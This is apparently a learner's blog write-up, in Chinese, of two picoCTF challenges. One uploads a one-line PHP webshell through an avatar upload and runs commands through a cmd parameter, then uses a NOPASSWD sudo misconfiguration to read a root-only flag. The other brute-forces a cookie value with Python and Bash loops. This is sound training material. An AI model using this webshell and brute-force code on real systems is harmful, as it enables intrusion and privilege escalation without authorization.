---
title: "picoCTF 兩題：檔案上傳 RCE 提權與 Cookie 爆破"
categories: [learning, security]
description: picoCTF 練兩題——n0s4n1ty 從上傳 webshell 拿到 RCE、再靠 sudo -l 提權讀 flag；Cookies 用「異常偵測」的爆破腳本找出跟基準不一樣的 cookie 值。
---

## 一、n0s4n1ty 1 — 上傳 webshell 拿到 RCE，再提權

### 題目情境
一個網站有「上傳大頭貼」功能。目標：從「能上傳檔案」一路打到「能執行系統指令、讀到 root 才能看的 flag」。

### 關鍵觀念：為什麼「上傳圖片功能」能變成 RCE?

網站以為使用者只會上傳圖片,但伺服器真正看的是**副檔名**,不是內容。如果伺服器允許上傳 `.php` 檔,而且上傳目錄剛好是**可以被瀏覽器直接訪問、且會被當 PHP 執行**的地方,那上傳的就不是圖片,是**一段會被伺服器執行的程式**。

> PHP 的角色在這裡很關鍵:PHP 是**伺服器端執行**的語言。你上傳 `.php` 檔案不會「被下載」,而是**被伺服器讀取並執行**——這跟你平常寫 Python/Bash 去發請求(client 端)完全是相反的方向。

### Webshell

上傳的檔案內容:

```php
<?php system($_GET["cmd"]); ?>
```

拆解:
- `system(...)`:PHP 內建函式,把參數字串**交給系統殼層執行**
- `$_GET["cmd"]`:讀取網址列 `?cmd=...` 這個參數的值
- `"cmd"` 這個名字是**我自己取的、寫在程式碼裡的**,不是什麼固定規範——想取別的名字也可以,伺服器只認程式碼怎麼寫

上傳成功後,用瀏覽器打開該檔案的網址,加上 `?cmd=指令`,就能讓伺服器執行任意指令:

```
http://靶機/uploads/shell.php?cmd=whoami
http://靶機/uploads/shell.php?cmd=cat flag.txt
```

🪤 **踩到的坑**:題目環境重啟後,主機/port 會換(docker 容器重啟是家常便飯),舊的 webshell 網址也跟著失效——其實是「忘記把新網址後面補上 `?cmd=`」,不是 PHP 壞了。看到報錯先想「網址對不對、cmd 帶了嗎」。

### 提權:從一般使用者到讀到 flag

拿到指令執行權後,第一次嘗試讀 `/root/flag.txt` 被拒絕(沒有權限)。這時候該想的不是「沒辦法了」,而是回頭用 **Day2 學過的 `sudo -l`**:

```
?cmd=sudo -l
```

結果顯示:

```
(ALL) NOPASSWD: ALL
```

這代表**目前這個使用者可以用 sudo 執行任何指令、且不用密碼**——這是嚴重的設定錯誤(misconfiguration)。於是:

```
?cmd=sudo cat /root/flag.txt
```

拿到 flag。

> ⚠️ 中間一度以為「`sudo` 一定要密碼才能用,所以沒辦法」——這個假設是錯的。`sudo` 能不能用、要不要密碼,完全看系統怎麼設定(`/etc/sudoers`),**不要用「印象中應該怎樣」去判斷,要用 `sudo -l` 去問系統「我到底有什麼權限」**。

### 攻擊鏈總覽

| 步驟 | 動作 | 對應概念 |
|---|---|---|
| 1 | 上傳 `.php` 檔(偽裝成大頭貼)| 檔案上傳漏洞(型別檢查形同虛設)|
| 2 | 訪問上傳的檔案網址 + `?cmd=` | Webshell → RCE(任意指令執行)|
| 3 | `sudo -l` 檢查權限 | 不假設、直接問系統 |
| 4 | `sudo cat /root/flag.txt` | 權限配置錯誤(NOPASSWD: ALL)被利用 → 提權 |

<!-- 這裡可補一張「webshell 上傳成功 + ?cmd=whoami 執行成功」的截圖,放到 /assets/images/learning/day7/n0s4n1ty-webshell.png 再把這行換成圖片語法。 -->

<!-- 這裡可補一張「sudo -l 顯示 NOPASSWD: ALL」的截圖,放到 /assets/images/learning/day7/n0s4n1ty-privesc.png 再把這行換成圖片語法。 -->

---

## 二、Cookies — Cookie 值爆破 + 異常偵測

### 題目情境
一個頁面會根據 cookie `name` 的值,回應不同內容。目標是找出「哪個值會回應特別的東西(flag)」。

### 第一步：觀察正常行為

F12 → Application → Cookies 看到 cookie 名叫 `name`。手動把值改成 `1`、`2`、`3`...,發現每個值都回應一句類似「餅乾小語」的句子,大部分是「Not very special」。

→ 既然值是數字、範圍看起來不大,**用迴圈把範圍內的值全部試一次**,找出「跟別人不一樣」的那個。

### 第二步：寫爆破腳本(Python)

```python
import requests

for i in range(0, 100):
    r = requests.get(
        'http://xebec.cylabacademy.net:24476/check',
        cookies={'name': str(i)},
        allow_redirects=False
    )
    if 'Not very special' not in r.text:
        print(i, r.text)
```

### 過程中踩的坑

| 錯誤 | 原因 | 修正 |
|---|---|---|
| `if 'picoCTF' in r:` 噴 TypeError | `r` 是 Response 物件,不是字串 | 改成 `r.text`(物件的「內容」屬性)|
| `TooManyRedirects: Exceeded 30 redirects` | 某些 cookie 值讓伺服器一直轉址(302),`requests` **預設會自動跟著跳轉**,跳不出去就爆掉 | 加 `allow_redirects=False`,不自動跟 |

### ⭐ 核心修正：爆破時怎麼「認出」答案?

一開始寫法是:

```python
import re
match = re.search(r'academy\{.*?\}', r.text)
```

**這個寫法的問題**:它預先假設 flag 長什麼樣子(`academy{...}` 格式)。但實戰中,**在找到答案之前,根本不知道答案會長怎樣**——這等於是先偷看答案、再回頭寫「偵測答案的規則」,邏輯上是倒反的。

> 正確的方法是：**異常偵測(anomaly detection)**——不去猜「答案長怎樣」,而是找「跟其他 99 個都不一樣的那一個」。具體做法二選一：
> 1. **找「缺少」正常特徵的那個**：`if 'Not very special' not in r.text`(多數值都有這句話,少了它的就是異類)
> 2. **比較長度**:把每個 `len(r.text)` 印出來,長度明顯不同的那筆就是答案

這個方法論其實貫穿了這整個學習過程,每次遇到「不知道答案格式」的情境都適用:
- Day4 掃 port:用**回應長度差異**判斷哪個 port 有東西
- 布林盲注:用**真/假**兩種回應差異當訊號
- 時間盲注:用**有沒有延遲**當訊號
- 這題:用**內容是否包含常見句子 / 長度是否異常**當訊號

**共同點：永遠拿「正常基準(baseline)」去跟每個結果比,差異本身就是答案在哪裡的線索,不需要先知道答案的格式。**

### 延伸討論：換個語言寫會怎樣?

**為什麼不用 PHP 寫?**
PHP 的本職是**伺服器端執行**(像 n0s4n1ty 那題的 webshell),不是用來「主動發 HTTP 請求去打別的網站」。要用 PHP 做這件事得手動 `curl_init()` / `curl_setopt()` / `curl_exec()` / `curl_close()`,比 Python 的 `requests.get()` 麻煩很多——角色不對,工具自然不順手。

**Bash 版長怎樣?**

```bash
for i in $(seq 0 99); do
  body=$(curl -s -b "name=$i" "http://xebec.cylabacademy.net:24476/check")
  if ! echo "$body" | grep -q "Not very special"; then
    echo "=== name=$i ==="
    echo "$body"
    break
  fi
done
```

有趣的是,**這個 bash 版天生不會踩到 `TooManyRedirects` 的坑**——因為 `curl` 預設**不會自動跟著跳轉**(要加 `-L` 才會跟),剛好跟 Python `requests` 預設**自動跟跳轉**相反:

| | 預設行為 | 遇到跳轉會怎樣 |
|---|---|---|
| Python `requests` | 跟 | 可能一路跟到爆(踩到的坑)|
| Bash `curl` | 不跟 | 只拿到 302 的空回應,不會爆 |

兩個工具沒有絕對的「誰更好」,但**要知道每個工具的預設行為差在哪,不然會在不知不覺中踩坑**。

### 總覽

| 步驟 | 動作 |
|---|---|
| 1 | 手動改 cookie 值,觀察「正常」回應長什麼樣 |
| 2 | 判斷範圍小、是數字 → 寫迴圈爆破 |
| 3 | 用 `allow_redirects=False` 避開跳轉爆掉的坑 |
| 4 | **不假設答案格式**,用「跟基準不一樣」當判斷條件 |
| 5 | 找到異常值 → 印出內容拿到 flag |

<!-- 這裡可補一張「爆破腳本跑出異常值」的截圖,放到 /assets/images/learning/day7/cookies-bruteforce.png 再把這行換成圖片語法。 -->

---

## 三、這兩題共同的收穫

- **「發現自己卡住」的正確下一步,是回頭問系統,不是放棄假設它不行**——`sudo -l` 這類「查詢指令」永遠比「憑印象判斷」可靠。
- **工具/語言要配合它的本職角色**:PHP 做伺服器端的事(webshell),Python/Bash 做客戶端發請求自動化的事,硬要對調只會多繞路。
- **不知道答案長怎樣時,找「跟基準不一樣的地方」,而不是先猜答案格式再去比對**——這是這幾天多次用到的核心思路(port scan、盲注、cookie 爆破都是同一套邏輯)。

---

## 四、我的心得

**n0s4n1ty 這題,從「上傳檔案」想到「這會被當程式執行」,這個轉念對我來說是：**
> 這很像是我以前學過的 SSRF 漏洞，都是靠著輸入被誤認為程式碼執行造成的悲劇。

**「不知道能不能 sudo,就去問系統」vs「憑印象覺得應該不行」——我自己過去是不是也常犯後者這種假設？**
> 是，我沒想到這題有這麼簡單 :(，當初想說沒有題目會簡單到可以讓所有使用者都有 sudo 權限。

**還想弄懂 / 下次想試的：**
> 下次我想試試看比較艱深一點的題目，不要有這麼簡單就可以把權限給拿到手的，但是可能要先把基礎給穩固一下。

---
*n0s4n1ty + Cookies 篇完 — 從「拿到執行權」到「拿到最高權限」,從「猜答案」到「找異常」。*
